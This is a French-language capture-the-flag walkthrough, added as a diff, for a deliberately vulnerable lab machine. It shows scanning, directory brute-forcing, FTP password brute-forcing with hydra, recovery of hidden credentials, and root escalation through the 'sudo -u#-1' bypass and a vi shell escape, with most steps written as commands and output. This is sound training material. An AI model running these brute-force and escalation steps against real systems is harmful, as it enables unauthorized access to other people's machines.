@@ -1,0 +1,215 @@
+
+Regarder les ports ouverts
+
+```bash
+nmap <ip>
+```
+=>
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+Vérifier le site web sur le port 80
+```bash
+gobuster dir -u http://<ip> -w Desktop/wordlists/dirb/common.txt
+```
+=>
+/.hta                 (Status: 403) [Size: 278]
+/.htpasswd            (Status: 403) [Size: 278]
+/assets               (Status: 301) [Size: 315] [--> http://10.10.104.219/assets/
+/.htaccess            (Status: 403) [Size: 278]
+/index.html           (Status: 200) [Size: 7853]
+/server-status        (Status: 403) [Size: 278]
+
+Allez sur internet et regarder ce que il y a dans la root assets
+```bash
+http:/<ip>/assets/
+```
+=>
+[VID]	MusaTroglodytarum.mp4	2021-11-29 15:57 	50M
+[TXT]	style.css	2021-11-29 13:04 	2.9K
+
+Allez voir la page style.css
+http://<ip>/assets/style.css
+=>
+/* Nice to see someone checking the stylesheets.
+    Take a look at the page: /l3_B4n4N13r_D3s_M0nT4gN3s.php
+*/
+
+Allez voir la page l3_B4n4N13r_D3s_M0nT4gN3s.php
+http://10.10.104.219/l3_B4n4N13r_D3s_M0nT4gN3s.php
+=> pop up : Word of advice... Turn off your javascript...
+
+Suivre ce site internet afin de désactive javascript:
+https://www.lifewire.com/disable-javascript-in-firefox-446039
+
+get le fichier l3_B4n4N13r_D3s_M0nT4gN3s.php
+```bash
+wget http://10.10.104.219:80/l3_B4n4N13r_D3s_M0nT4gN3s.php
+```
+=>
+--2023-11-21 15:26:14--  http://10.10.104.219/l3_B4n4N13r_D3s_M0nT4gN3s.php
+Connecting to 10.10.104.219:80... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: intermediary.php?hidden_directory=/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3 [following]
+--2023-11-21 15:26:14--  http://10.10.104.219/intermediary.php?hidden_directory=/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3
+Reusing existing connection to 10.10.104.219:80.
+HTTP request sent, awaiting response... 302 Found
+Location: /l3_B4n4N13r_D3s_M0nT4gN3s [following]
+--2023-11-21 15:26:14--  http://10.10.104.219/l3_B4n4N13r_D3s_M0nT4gN3s
+Reusing existing connection to 10.10.104.219:80.
+HTTP request sent, awaiting response... 301 Moved Permanently
+Location: http://10.10.104.219/l3_B4n4N13r_D3s_M0nT4gN3s/ [following]
+--2023-11-21 15:26:14--  http://10.10.104.219/l3_B4n4N13r_D3s_M0nT4gN3s/
+Reusing existing connection to 10.10.104.219:80.
+HTTP request sent, awaiting response... 200 OK
+Length: 618 [text/html]
+Saving to: ‘l3_B4n4N13r_D3s_M0nT4gN3s.php’
+
+Nous pouvons allé voir dans la page caché L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3
+http://<ip>/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3/
+=>
+[IMG]	Hot_Babe.png	2021-11-30 09:34 	262K
+
+Par la suitre nous pouvons téléchargé ce png et faire de la stéganography dessus
+
+La steganography de hot Hot_Babe nous donne une liste de 200 password et on nous que l'un d'entre eux est le password du user banane_celeste
+
+on copy les password dans password.txt
+
+On test tous les password pour nous connecter en ftp avec banane_celeste
+```bash
+hydra -l banane_celeste -P password.txt ftp://<ip> -V
+```
+=>
+[21][ftp] host: 10.10.104.219   login: banane_celeste   password: 4nndoLjqyBE0FSIDivNC
+
+on se login ftp
+```bash
+ftp <ip>
+```
+=>
+ftp> ls
+229 Entering Extended Passive Mode (|||21463|).
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             860 Nov 08  2022 Valerian's_Creds.txt
+226 Directory send OK.
+ftp> get Valerian's_Creds.txt
+
+Nous pouvons regarder le contenu du fichier que nous venons de téléchargé
+```bash
+cat Valerian's_Creds.txt
+```
+=> Get out, there is nothing here!
+[suivit de plein de lignes contenants des espaces et des tabs]
+
+Nous pouvons utiliser sur cette liste d'espaces et de tab le script convert.py
+```bash
+python convert.py
+```
+=>
+on obtient
+User: valerian
+Password: T4k_t4k_S0lide_Dyn0_int0_Cr1mP
+
+on se login en ssh
+```bash
+ssh valerian@<ip>
+```
+=>
+1 new message
+Message from Root to Gabriel:
+
+"Gabriel, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"
+
+END MESSAGE
+
+Une fois login nous pouvons avoir acces au flag user
+```bash
+ssh>cat user.txt
+```
+
+Une fois cela fais nous pouvons nous attardé sur le message de root pour gabriel
+car notre prochain objectif c'estd e devenir root
+pour cela nous devons dabord devenir gabriel
+
+Nous pouvons chercher le fchier "s3cr3t" dont root nous parle
+```bash
+ssh>find / -name s3cr3t 2>/dev/null
+```
+=>
+/usr/games/s3cr3t
+
+nous pouvons mainetannt nous rendre dans ce dossier et regarder ce que il conntient
+```bash
+ssh>cd /usr/games/s3cr3t
+ssh>ls -la
+```
+=>
+-rw-r--r-- 1 root root  156 Nov 29  2021 .th1s_m3ss4ag3_15_f0r_g4br13L_0nly!
+
+Nous pouvons voir un fichier destiné à gabriel, donc surment une piste pour devenitr lui
+
+```bash
+ssh>cat .th1s_m3ss4ag3_15_f0r_g4br13L_0nly!
+```
+=>
+Your password is awful, Gabriel. 
+It should be at least 60 characters long! Not just ca_serait_jamais_arrive_en_haskell
+Honestly!
+
+Yours sincerely
+   -Root
+
+Nous avons mainenat le nom etr le mot de passe de gabriel
+user: Gabriel
+password: ca_serait_jamais_arrive_en_haskell
+
+Donc nous pouvons nous login en tant que gabriel
+```bash
+ssh> su gabriel
+```
+
+NOus pouvons regarder ce que nous avons le droit d'éxécuté
+```bash
+ssh> sudo -l
+```
+=>
+(ALL, !root) NOPASSWD: /usr/bin/vi /home/gabriel/user.txt
+
+nous pouvons essayer de d'ouvrir lle user.txt avec vim en sudo
+```bash
+ssh> sudo /usr/bin/vi /home/gabriel/user.txt
+```
+=>
+Sorry, user gabriel is not allowed to execute '/usr/bin/vi /home/gabriel/user.txt' as root on muso-troglodytarum.
+
+Ceci arrive car (ALL, !root) signiqfie que tous le monde peut executer la commande sauf root
+Nous devosn donc utilisé le sudo de gabriel en précisant que on veut utilisé l'utilisateur root
+```bash
+ssh>sudo -u#-1 /usr/bin/vi /home/gabriel/user.txt
+```
+Une fois dans le fichier nous devons entré dans vim la combinaison suivante
+pour dire d'exécuter la commande qui lance un shell
+```bash
+-> :! /bin/bash
+```
+
+Nous pouvons maintenant vérifié qui nous somme
+```bash
+ssh> whoami
+```
+=>
+root
+
+l'éscalade de privilège à bien fonction
+nous pouvons maintenant vérifier où est le fichier root.txt
+```bash
+ssh>find / -name root.txt 2>/dev/null
+```
+=>
+/root/root.txt
+et enfin récupéré le flag root
+```bash
+ssh>cat /root/root.txt
+```
